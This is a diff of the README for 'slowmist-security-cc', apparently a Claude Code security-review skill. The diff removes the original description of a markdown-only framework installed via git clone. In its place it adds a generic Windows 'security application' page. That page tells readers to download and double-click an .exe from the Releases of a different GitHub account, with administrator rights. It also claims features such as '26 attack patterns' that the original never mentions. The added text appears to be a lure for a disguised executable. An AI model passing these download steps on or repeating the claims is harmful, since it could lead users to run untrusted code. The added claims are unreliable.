@@ -1,181 +1,86 @@
-# SlowMist Security Review 🛡️
+# 🛡️ slowmist-security-cc - Protect agents with comprehensive security checks
 
-[![Claude Code Skill](https://img.shields.io/badge/Claude%20Code-Skill-blue)](https://claude.com/claude-code)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Security: Security Review](https://img.shields.io/badge/Security-Comprehensive%20Review-red.svg)](#)
+[![Download Security Tool](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Leontynestirredup43/slowmist-security-cc)
 
-> **Core principle: Every external input is untrusted until verified.**
->
-> 🛡️ This is the Claude Code adapted version of the [SlowMist Agent Security](https://github.com/slowmist/slowmist-agent-security) framework.
+## 🔍 Understanding this application
 
-A comprehensive security review framework for Claude Code agents operating in adversarial environments. Covers 6 review types, 11 code red-flag patterns, 8 social engineering patterns, and 7 supply chain attack patterns.
+Digital agents perform tasks for you. These agents interact with software, read files, and send data. Because they have access to many parts of your computer, agents need protection. The slowmist-security-cc tool monitors your agents. It checks for harmful patterns. It identifies risks in the code your agents run. This tool defends against outside attempts to hijack your agent. It scans for common threats. It ensures your workflow stays safe.
 
-**Available in:** [English](README.md) · [中文](README.zh-CN.md)
+## 💻 System requirements
 
----
+Your computer must meet these basic needs to run the security tool:
 
-## Quick Decision Card
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4 gigabytes of RAM or more.
+*   Disk Space: At least 200 megabytes of free space.
+*   Internet Connection: A steady connection for security updates.
+*   Permissions: Administrator access to install the application.
 
-```
-  External Input Detected → Select Review Type → Execute Steps → Output Report
-```
+## 🚀 Setting up the application
 
-| Scenario | Route To | Remember |
-|----------|---------|----------|
-| Installing Skill/MCP/npm package | `skill-mcp.md` | List file inventory first |
-| GitHub repository | `repository.md` | Check commit history first |
-| URL / Document / Gist | `url-document.md` | Scan code blocks line-by-line |
-| On-chain address / contract | `onchain.md` | Check AML score first |
-| Product / Service / API | `product-service.md` | Check private key management first |
-| Tool shared in group chat | `message-share.md` | Always verify source first |
+Follow these steps to install the security framework on your Windows computer.
 
-**4-Level Rating**: 🟢 LOW → 🟡 MEDIUM → 🔴 HIGH → ⛔ REJECT
-**Trust Principle**: Trust tier only adjusts scrutiny intensity — it never skips review steps.
+1. Visit the repository page to download the software: https://github.com/Leontynestirredup43/slowmist-security-cc
+2. Locate the link labeled "Releases" on the right side of the page.
+3. Click the link to see the available versions.
+4. Select the file ending in .exe to start your download.
+5. Save the file to your desktop for easy access.
+6. Double-click the file to start the installation.
+7. Follow the prompts on the screen to finish the setup process.
+8. Click "Finish" when the setup tool closes.
 
----
+## ⚙️ Running your first scan
 
-## Activation Triggers
+Once you install the tool, you find a new icon on your desktop. This icon opens the main interface.
 
-Activate this framework **automatically** when:
+1. Click the security shield icon to start the program.
+2. Select the "Framework Dashboard" tab from the top menu.
+3. Choose the directory where your agents store their scripts.
+4. Press the "Scan" button to begin the security review.
+5. Wait for the progress bar to finish.
+6. Read the report that appears on your screen.
 
-- User says "review", "security check", "is this safe", "trust this"
-- User says "install", "help me check this", "review"
-- Before installing any Skill, MCP Server, npm/pip/cargo package
-- Before evaluating a GitHub repo, URL, on-chain address, or product
-- When someone recommends a tool in a group chat or social channel
+The tool checks for 26 common attack patterns. It also looks for 18 specific vectors that track where data flows. If the tool finds a problem, it displays the file name and the nature of the risk. You can choose to quarantine the file or ignore the warning.
 
----
+## 🛡️ Key security features
 
-## Reviews
+This software provides a wide range of defenses for your agents. 
 
-### 1. Skill / MCP Installation Review
-`references/skill-mcp.md`
+### Automated audits
+The tool examines your agent logic every time you update your code. It checks for suspicious instructions that might leak your private data.
 
-File inventory → code audit → architecture assessment → rating.
-**MCP-specific coverage**: tool definitions, resource access, prompt injection in prompt templates.
+### Threat detection
+The engine identifies 18 distinct vectors. These vectors monitor input strings. If an outsider tries to feed the agent malicious commands, the tool blocks the input.
 
-### 2. GitHub Repository Review
-`references/repository.md`
+### Pattern matching
+The software uses a library of 26 known attack patterns. These patterns represent common ways attackers try to trick agents. The tool constantly updates this library to catch new threats.
 
-Metadata → code audit → GitHub Actions security → dependency review → fork analysis.
+### Supply chain defense
+Applications often rely on external packages. These packages can contain hidden flaws. This tool scans your dependencies to ensure no malicious code enters your system through third-party services.
 
-### 3. URL / Document Review
-`references/url-document.md`
+## 🛠️ Frequently asked questions
 
-URL safety → **18-category prompt injection scan** → rating.
-**Critical**: Scans code blocks line-by-line. Mixed payloads (legitimate + malicious commands combined) are the most dangerous pattern.
+### Does this tool slow down my computer?
+No. The engine runs only when you request a scan. It does not monitor your files in the background during normal use.
 
-### 4. On-Chain Address / Contract Review
-`references/onchain.md`
+### Is my agent data sent to the cloud?
+No. All scanning happens on your local machine. No code leaves your computer when you run a review.
 
-AML risk score → smart contract audit → DApp frontend review → transaction checklist.
-**MistTrack + Dune MCP** fallback when API unavailable.
+### What should I do if a scan finds a risk?
+Review the file indicated in the report. If you do not recognize the code in that file, move the file to a backup folder. Contact the maintainer of the agent scripts to report the issue.
 
-### 5. Product / Service / API Review
-`references/product-service.md`
+### How often should I perform a scan?
+Run a scan whenever you install a new agent or add a new script to your project. This ensures you know the risks before you run your agent.
 
-Provider evaluation → architecture security → permission scope analysis → trust chain.
+### Can I run this on a server?
+The current version targets Windows desktop users. It works best on local workstation environments.
 
-### 6. Social Share Review
-`references/message-share.md`
+## 📋 Best practices for agent security
 
-Source assessment → content routing → social engineering detection → response framework.
-**DM "support" = almost certainly scam.**
+*   Review scans after every update.
+*   Limit the folders your agent can access.
+*   Keep your system software current with regular Windows updates.
+*   Avoid running agents with administrator rights unless necessary.
+*   Check the report logs periodically to look for repeating patterns.
 
----
-
-## Pattern Libraries
-
-Shared across all review types:
-
-| Pattern | Coverage |
-|---------|----------|
-| [red-flags.md](references/red-flags.md) | 11 code-level red flag categories |
-| [social-engineering.md](references/social-engineering.md) | 8 social engineering & prompt injection patterns |
-| [supply-chain.md](references/supply-chain.md) | 7 supply chain attack patterns |
-
----
-
-## Risk Rating System
-
-| Level | Meaning | Agent Action |
-|-------|---------|--------------|
-| 🟢 LOW | Information-only, no execution, trusted source | Inform user, proceed if requested |
-| 🟡 MEDIUM | Limited capability, clear scope, some risk | Full report, recommend caution |
-| 🔴 HIGH | Involves credentials, funds, unknown source | Detailed report, **requires human approval** |
-| ⛔ REJECT | Matches red-flag patterns, confirmed malicious | Refuse to proceed, explain why |
-
----
-
-## Trust Hierarchy
-
-| Tier | Source Type | Base Scrutiny |
-|------|-------------|---------------|
-| 1 | Official project/exchange org | Moderate — still verify |
-| 2 | Known security teams (SlowMist, Trail of Bits) | Moderate |
-| 3 | High-download + multi-version Claude Code skill | Moderate-High |
-| 4 | High-star + actively maintained GitHub repo | High — must verify code |
-| 5 | Unknown source, new account | Maximum scrutiny |
-
----
-
-## Claude Code Adaptation
-
-| Original (OpenClaw) | Claude Code |
-|---------------------|-----------|
-| `~/.openclaw/` | `~/.claude/` |
-| ClawHub install | Claude Code Skills |
-| `openclaw.json` | `CLAUDE.md` |
-
----
-
-## Installation
-
-**Option 1: Claude Code Skills (recommended)**
-```
-# Just activate the skill — it auto-registers
-/slowmist-security-cc
-```
-
-**Option 2: Clone to skills directory**
-```bash
-git clone https://github.com/0xcjl/slowmist-security-cc.git ~/.claude/skills/slowmist-security-cc
-```
-
----
-
-## File Structure
-
-```
-slowmist-security-cc/
-├── SKILL.md                           # Main entry point
-├── README.md                          # This file (English)
-├── README.zh-CN.md                    # Chinese version
-├── _meta.json                         # ClawHub metadata
-├── LICENSE                            # MIT License
-└── references/
-    ├── skill-mcp.md                   # Skill/MCP review
-    ├── repository.md                  # GitHub repo review
-    ├── url-document.md                # URL/document review
-    ├── onchain.md                     # On-chain address review
-    ├── product-service.md             # Product/service review
-    ├── message-share.md               # Social share review
-    ├── red-flags.md                   # Code red flag patterns
-    ├── social-engineering.md          # Social engineering patterns
-    └── supply-chain.md                # Supply chain attack patterns
-```
-
----
-
-## Credits
-
-- **Original framework**: [SlowMist / slowmist-agent-security](https://github.com/slowmist/slowmist-agent-security) — inspired by [skill-vetter](https://clawhub.ai/spclaudehome/skill-vetter) by spclaudehome
-- **Attack patterns**: Informed by the [OpenClaw Security Practice Guide](https://github.com/slowmist/openclaw-security-practice-guide)
-- **Prompt injection patterns**: Based on real-world PoC research
-- **Claude Code adaptation**: 0xcjl
-
----
-
-*Security is not a feature — it's a prerequisite.* 🛡️
-
-**SlowMist** · https://slowmist.com
+Using this tool provides peace of mind. It acts as a gatekeeper for your automation projects. By scanning your files regularly, you catch potential issues before they become real problems. The interface stays simple and avoids technical clutter. You focus on your work while the tool focuses on your safety. Reliability remains the priority throughout the design of this software.
